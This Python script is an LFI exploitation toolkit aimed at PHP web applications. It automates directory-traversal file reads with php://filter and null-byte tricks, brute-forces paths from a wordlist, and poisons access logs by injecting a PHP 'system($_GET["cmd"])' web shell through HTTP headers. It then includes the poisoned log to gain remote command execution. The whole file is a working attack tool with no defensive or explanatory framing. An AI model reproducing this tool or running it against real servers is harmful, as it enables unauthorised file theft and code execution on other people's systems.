import requests
import argparse
import urllib.parse
import time
import base64

# --- CONFIG ---
USE_PROXY = True
PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
VERIFY_SSL = False
# --------------

def build_payload(file_path, use_filter=False, use_null_byte=False):
    if use_filter:
        payload = f'php://filter/read=convert.base64-encode/resource={file_path}'
    else:
        payload = file_path

    if use_null_byte:
        payload += '%00'

    return payload

def lfi_request(url, param, payload, headers, cmd=None):
    query = f"{param}={urllib.parse.quote(payload)}"
    if cmd:
        query += f"&cmd={urllib.parse.quote(cmd)}"
    full_url = f"{url}?{query}"

    try:
        res = requests.get(
            full_url,
            headers=headers,
            proxies=PROXIES if USE_PROXY else {},
            verify=VERIFY_SSL,
            timeout=10
        )
        return res
    except Exception as e:
        return f"[!] Request failed: {e}"

def run_single(url, param, file_path, headers, use_filter, use_null, max_depth):
    for depth in range(max_depth + 1):
        prefix = "../" * depth
        target = prefix + file_path.lstrip('/')
        payload = build_payload(target, use_filter, use_null)
        print(f"[*] Trying depth {depth}: {payload}")
        res = lfi_request(url, param, payload, headers)

        if isinstance(res, str):
            print(res)
            continue

        if res.status_code == 200:
            print("[+] Response (first 500 chars):")
            print(res.text[:500])

            if use_filter:
                try:
                    decoded = base64.b64decode(res.text.encode()).decode()
                    print("\n[+] Base64 decoded output:\n" + decoded)
                except Exception as e:
                    print(f"[!] Decoding failed: {e}")
            break

def run_enum(url, param, wordlist_file, headers, use_filter, use_null, max_depth):
    with open(wordlist_file, 'r') as f:
        paths = [line.strip() for line in f if line.strip()]
    for path in paths:
        for depth in range(max_depth + 1):
            prefix = "../" * depth
            target = prefix + path.lstrip('/')
            payload = build_payload(target, use_filter, use_null)

            res = lfi_request(url, param, payload, headers)
            if isinstance(res, str):
                print(res)
                continue

            if "No such file" not in res.text and res.status_code == 200:
                print(f"[+] Possible file found: {target}")
                print(res.text[:300])
                print('-' * 50)

def poison_logs(target_url, method='header', php_payload='<?php system($_GET["cmd"]); ?>'):
    print(f"[*] Injecting PHP into logs via {method.upper()}...")
    headers = {}

    if method in ['header', 'both']:
        headers['User-Agent'] = php_payload
        headers['Referer'] = php_payload
        headers['X-Forwarded-For'] = php_payload

    url = target_url
    if method in ['path', 'both']:
        path_payload = urllib.parse.quote(php_payload)
        url = urllib.parse.urljoin(target_url + '/', path_payload)

    try:
        requests.get(
            url,
            headers=headers,
            proxies=PROXIES if USE_PROXY else {},
            verify=VERIFY_SSL,
            timeout=10
        )
        print("[+] Log injection sent.")
    except Exception as e:
        print(f"[!] Error injecting log payload: {e}")

def trigger_log_rce(url, param, log_file, cmd, headers, depth=6):
    print("[*] Attempting to include log file for RCE...")
    for d in range(depth + 1):
        prefix = "../" * d
        target = prefix + log_file.lstrip('/')
        payload = f"{target}"
        full_url = f"{url}?{param}={urllib.parse.quote(payload)}&cmd={urllib.parse.quote(cmd)}"

        print(f"[*] Trying: {full_url}")
        try:
            r = requests.get(
                full_url,
                headers=headers,
                proxies=PROXIES if USE_PROXY else {},
                verify=VERIFY_SSL,
                timeout=10
            )
            if "uid=" in r.text or "root" in r.text or r.status_code == 200:
                print("[+] RCE Triggered!")
                print(r.text[:500])
                break
        except Exception as e:
            print(f"[!] Error triggering RCE: {e}")

def main():
    parser = argparse.ArgumentParser(description="ðŸ’£ LFI Exploitation Toolkit with Log Poisoning")
    parser.add_argument('--url', required=True, help="Target base URL (e.g. http://target/index.php)")
    parser.add_argument('--param', required=True, help="Vulnerable GET parameter name (e.g. file, page)")
    parser.add_argument('--file', help="Single file to read (e.g. /etc/passwd)")
    parser.add_argument('--wordlist', help="Path to wordlist for brute-force")
    parser.add_argument('--filter', action='store_true', help="Use php://filter base64 wrapper")
    parser.add_argument('--nullbyte', action='store_true', help="Append %00 to bypass extension restrictions")
    parser.add_argument('--depth', type=int, default=6, help="Max ../ traversal depth (default: 6)")
    parser.add_argument('--cookie', help="Cookie string (e.g. PHPSESSID=xyz; admin=true)")
    parser.add_argument('--header', action='append', help="Custom headers in Key:Value format")
    parser.add_argument('--no-proxy', action='store_true', help="Disable proxying through Burp")
    
    # Log Poisoning / RCE
    parser.add_argument('--poison', action='store_true', help="Enable log poisoning (inject PHP)")
    parser.add_argument('--inject-method', choices=['header', 'path', 'both'], default='header', help="Log injection point")
    parser.add_argument('--rce-file', help="Log file path to include (e.g. /var/log/apache2/access.log)")
    parser.add_argument('--rce-cmd', default='id', help="Command to execute via RCE (default: id)")

    args = parser.parse_args()

    global USE_PROXY
    if args.no_proxy:
        USE_PROXY = False

    headers = {}
    if args.cookie:
        headers['Cookie'] = args.cookie
    if args.header:
        for h in args.header:
            try:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()
            except:
                print(f"[!] Malformed header: {h}")

    if args.poison and args.rce_file:
        poison_logs(args.url, args.inject_method)
        print("[*] Waiting for log flush...")
        time.sleep(3)
        trigger_log_rce(args.url, args.param, args.rce_file, args.rce_cmd, headers, args.depth)
        return

    if args.file:
        run_single(args.url, args.param, args.file, headers, args.filter, args.nullbyte, args.depth)
    elif args.wordlist:
        run_enum(args.url, args.param, args.wordlist, headers, args.filter, args.nullbyte, args.depth)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
